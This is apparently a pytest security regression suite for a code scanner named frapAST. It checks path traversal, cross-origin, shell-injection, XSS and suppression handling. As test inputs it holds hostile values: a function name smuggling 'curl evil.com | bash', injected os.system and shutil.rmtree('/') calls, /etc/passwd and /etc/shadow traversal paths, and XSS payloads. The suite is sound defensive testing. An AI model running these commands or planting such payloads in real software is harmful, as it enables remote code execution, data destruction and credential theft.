"""test_security_hardening_regression.py — Hardened security regression test suite for frapAST.

This suite performs real-request tests and adversarial unit tests to verify:
1. Web Layer Path Traversal: /api/browse, /api/snippet, /api/scan, and static file serving.
2. Web Layer CSRF / Cross-Origin Protection: Origin validation on mutating endpoints.
3. Proof Orchestrator & HTTP Synthesis: Shell injection and CRLF/heredoc injection prevention.
4. Web UI XSS Prevention: Safe encoding and text-content escaping of hostile inputs.
5. Suppression Engine Robustness: Handling malformed and non-standard comment inputs.
"""

from __future__ import annotations

import html
import http.server
import json
import os
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from types import SimpleNamespace

import pytest

import scanner.web.db as _db
from scanner.proof.http_synthesis import (
    _reject_if_newline,
    synthesize_http_rpc_reproducer,
)
from scanner.proof.orchestrator import ProofOrchestrator, ProofStatus
from scanner.rules.engine import Candidate
from scanner.suppression import is_suppressed
from scanner.web.server import _Handler, _resolve_file_path


# ---------------------------------------------------------------------------
# Test Server Fixture for Web-Layer Real HTTP Testing
# ---------------------------------------------------------------------------

@pytest.fixture(scope="module")
def web_test_server():
    """Start an actual ephemeral HTTP server with initialized DB for live API testing."""
    with tempfile.TemporaryDirectory() as td:
        db_path = Path(td) / "test_findings.db"
        _db.init(db_path)

        # Create a mock scanned repository inside temp directory
        repo_dir = Path(td) / "mock_app"
        repo_dir.mkdir()
        (repo_dir / "api.py").write_text("def hello():\n    return 'safe'\n", encoding="utf-8")
        _db.create_scan("scan-test-1", str(repo_dir))

        # Pick an ephemeral port
        server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _Handler)
        port = server.server_address[1]
        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()
        time.sleep(0.1)

        base_url = f"http://127.0.0.1:{port}"
        yield SimpleNamespace(base_url=base_url, port=port, repo_dir=repo_dir, temp_dir=Path(td))

        server.shutdown()


def _http_request(base_url: str, method: str, path: str, body: dict | None = None, headers: dict | None = None):
    req_headers = headers.copy() if headers else {}
    data = None
    if body is not None:
        data = json.dumps(body).encode("utf-8")
        req_headers["Content-Type"] = "application/json"

    url = f"{base_url}{path}"
    req = urllib.request.Request(url, data=data, headers=req_headers, method=method)
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, resp.read().decode("utf-8")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8")


# ---------------------------------------------------------------------------
# 1. Web Layer Path Traversal & Containment
# ---------------------------------------------------------------------------

class TestWebLayerPathTraversal:
    """Verifies that all web layer endpoints enforce path containment and prevent traversal."""

    def test_api_browse_rejects_etc_traversal(self, web_test_server):
        """GET /api/browse with traversal to /etc must not browse /etc."""
        traversal_paths = [
            "../../../../etc",
            "/etc",
            "../../../../var",
            "/System",
        ]
        for p in traversal_paths:
            status, body = _http_request(web_test_server.base_url, "GET", f"/api/browse?path={urllib.parse.quote(p)}")
            assert status == 200
            data = json.loads(body)
            resolved = data.get("current_path", "")
            # Must fall back to user home or stay inside allowed root, NEVER /etc
            assert resolved != "/etc" and not resolved.startswith("/etc")
            assert resolved != "/var" and not resolved.startswith("/var")
            assert resolved != "/System" and not resolved.startswith("/System")

    def test_api_snippet_rejects_arbitrary_file_read(self, web_test_server):
        """GET /api/snippet with ../etc/passwd must not leak file contents."""
        traversal_files = [
            "../../../../etc/passwd",
            "/etc/passwd",
            "../../../../etc/shadow",
            "../../../../var/log/system.log",
        ]
        for f in traversal_files:
            status, body = _http_request(web_test_server.base_url, "GET", f"/api/snippet?file={urllib.parse.quote(f)}&line=1")
            assert status == 200
            data = json.loads(body)
            # Response must have an error and 0 leaked lines
            assert len(data.get("lines", [])) == 0
            assert "error" in data or "Could not confidently resolve" in data.get("error", "")
            assert "root:" not in body

    def test_static_file_handler_rejects_path_traversal(self, web_test_server):
        """GET /../../../../etc/passwd must return 404 Not Found."""
        status, _ = _http_request(web_test_server.base_url, "GET", "/../../../../etc/passwd")
        assert status == 404

    def test_api_scan_rejects_system_directories(self, web_test_server):
        """POST /api/scan with /etc or /var must be rejected with 403 Forbidden."""
        trusted_headers = {"Origin": f"http://127.0.0.1:{web_test_server.port}"}
        forbidden_targets = ["/etc", "/var", "/System", "../../../../etc"]
        for target in forbidden_targets:
            status, body = _http_request(
                web_test_server.base_url,
                "POST",
                "/api/scan",
                body={"repo_path": target},
                headers=trusted_headers,
            )
            assert status == 403
            assert "outside allowed workspace roots" in body

    def test_resolve_file_path_unit_containment(self, tmp_path):
        """Unit test _resolve_file_path against malicious path patterns."""
        repo_root = tmp_path / "repo"
        repo_root.mkdir()
        (repo_root / "safe.py").write_text("x = 1")

        # Safe file resolves
        assert _resolve_file_path(repo_root, "safe.py") == (repo_root / "safe.py").resolve()

        # Absolute paths rejected
        assert _resolve_file_path(repo_root, "/etc/passwd") is None

        # Path traversal outside repo rejected
        assert _resolve_file_path(repo_root, "../../../etc/passwd") is None
        assert _resolve_file_path(repo_root, "../../nonexistent.py") is None


# ---------------------------------------------------------------------------
# 2. Web Layer CSRF & Origin Security
# ---------------------------------------------------------------------------

class TestWebLayerOriginSecurity:
    """Verifies that state-mutating POST endpoints enforce Origin checks."""

    def test_post_scan_rejects_untrusted_origin(self, web_test_server):
        """POST /api/scan with untrusted Origin must return 403."""
        status, body = _http_request(
            web_test_server.base_url,
            "POST",
            "/api/scan",
            body={"repo_path": str(web_test_server.repo_dir)},
            headers={"Origin": "http://attacker.com"},
        )
        assert status == 403
        assert "Cross-origin requests are not allowed" in body

    def test_post_prove_rejects_untrusted_origin(self, web_test_server):
        """POST /api/prove with untrusted Origin must return 403."""
        status, body = _http_request(
            web_test_server.base_url,
            "POST",
            "/api/prove",
            body={"finding_ids": ["FR-1"]},
            headers={"Origin": "http://attacker.com"},
        )
        assert status == 403
        assert "Cross-origin requests are not allowed" in body


# ---------------------------------------------------------------------------
# 3. Proof Orchestrator & HTTP Synthesis Shell Injection Prevention
# ---------------------------------------------------------------------------

class TestProofOrchestratorShellSafety:
    """Verifies that proof generation and execution cannot be hijacked via shell/code injection."""

    def test_synthesize_http_reproducer_rejects_newline_injection(self, tmp_path):
        """synthesize_http_rpc_reproducer must reject function names containing newlines or heredoc escapes."""
        hostile_candidates = [
            {
                "rule_id": "FR-PERM-001",
                "file": "api.py",
                "line": 1,
                "function": "get_data\nimport os; os.system('whoami')",
            },
            {
                "rule_id": "FR-CSRF-001",
                "file": "api.py",
                "line": 1,
                "function": "submit_form\r\nimport shutil; shutil.rmtree('/')",
            },
            {
                "rule_id": "FR-PERM-001",
                "file": "api.py",
                "line": 1,
                "function": """handler\nEOF\ncurl evil.com | bash\ncat << 'EOF'""",
            },
        ]
        for c in hostile_candidates:
            result = synthesize_http_rpc_reproducer(tmp_path, "finding-1", c, workspace_root=tmp_path)
            assert result is None, f"Expected rejection (None) for hostile function name, got: {result}"

    def test_reject_if_newline_helper(self):
        """_reject_if_newline must detect CRLF in any argument."""
        assert _reject_if_newline("safe_function_name") is False
        assert _reject_if_newline("bad\nfunction") is True
        assert _reject_if_newline("bad\rfunction") is True
        assert _reject_if_newline("safe", "also_safe", "not\nsafe") is True

    def test_orchestrator_executes_as_argument_list_not_shell(self, tmp_path):
        """Orchestrator must execute reproducer scripts via argument array, not shell string."""
        reproducer_script = tmp_path / "reproducer.sh"
        # Script echoes input safely
        reproducer_script.write_text("#!/usr/bin/env bash\necho 'OK'\n", encoding="utf-8")
        reproducer_script.chmod(0o755)

        orch = ProofOrchestrator(workspace_root=tmp_path)
        result = orch._run_tier1("test-finding-1", reproducer_script)
        assert result.status == ProofStatus.PASSED
        assert result.exit_code == 0
        assert "OK" in result.stdout


# ---------------------------------------------------------------------------
# 4. Web UI XSS Prevention
# ---------------------------------------------------------------------------

class TestWebUIXSSPrevention:
    """Verifies that HTML-like strings in finding metadata are properly escaped."""

    def test_html_escaping_utility(self):
        """Verify HTML escape character mapping."""
        payloads = [
            ("<script>alert('XSS')</script>", "&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;"),
            ('<img src=x onerror="alert(1)">', '&lt;img src=x onerror=&quot;alert(1)&quot;&gt;'),
            ('foo & bar', 'foo &amp; bar'),
            ('"><h1>test</h1>', '&quot;&gt;&lt;h1&gt;test&lt;/h1&gt;'),
        ]
        for raw, expected in payloads:
            escaped = html.escape(raw, quote=True).replace("'", "&#39;")
            assert "<" not in escaped
            assert ">" not in escaped
            assert '"' not in escaped

    def test_json_api_serializes_clean_strings(self, web_test_server):
        """Verify finding payloads containing script tags serialize as pure JSON strings."""
        hostile_finding_id = "XSS-1"
        _db.upsert_findings("scan-test-1", [{
            "id": hostile_finding_id,
            "rule_id": "<script>alert(1)</script>",
            "file": "app/<img src=x onerror=alert(2)>.py",
            "line": 10,
            "function": "malicious_fn()<svg onload=alert(3)>",
            "evidence": "Evidence with <script>eval('evil')</script>",
            "description": "Desc <iframe src=javascript:alert(4)>",
            "status": "candidate",
            "score": 8.5,
        }])
        status, body = _http_request(web_test_server.base_url, "GET", "/api/findings?scan_id=scan-test-1")
        assert status == 200
        data = json.loads(body)
        cands = [c for c in data.get("candidates", []) if c.get("id") == hostile_finding_id]
        assert len(cands) == 1
        cand = cands[0]
        # Verified string content remains literal in JSON without raw HTML execution context
        assert cand["rule_id"] == "<script>alert(1)</script>"
        assert cand["file"] == "app/<img src=x onerror=alert(2)>.py"


# ---------------------------------------------------------------------------
# 5. Suppression Engine Robustness
# ---------------------------------------------------------------------------

class TestSuppressionEngineRobustness:
    """Verifies edge case and malformed input handling in the suppression engine."""

    def test_empty_source_lines(self):
        candidate = SimpleNamespace(
            rule_id="FR-PERM-001",
            taxonomy_id="FR-PERM-001",
            file="app/api.py",
            line=1,
            code_location_hash="abc",
            function="f",
        )
        assert is_suppressed(candidate, {"app/api.py": []}) is False

    def test_line_number_beyond_file_length(self):
        candidate = SimpleNamespace(
            rule_id="FR-PERM-001",
            taxonomy_id="FR-PERM-001",
            file="app/api.py",
            line=9999,
            code_location_hash="abc",
            function="f",
        )
        assert is_suppressed(candidate, {"app/api.py": ["line 1", "line 2"]}) is False

    def test_unicode_in_suppression_comment(self):
        candidate = SimpleNamespace(
            rule_id="FR-PERM-001",
            taxonomy_id="FR-PERM-001",
            file="app/api.py",
            line=1,
            code_location_hash="abc",
            function="f",
        )
        lines = {"app/api.py": ["some_code()  # frapast: ignore FR-PERM-001 — unicode safe"]}
        assert is_suppressed(candidate, lines) is True
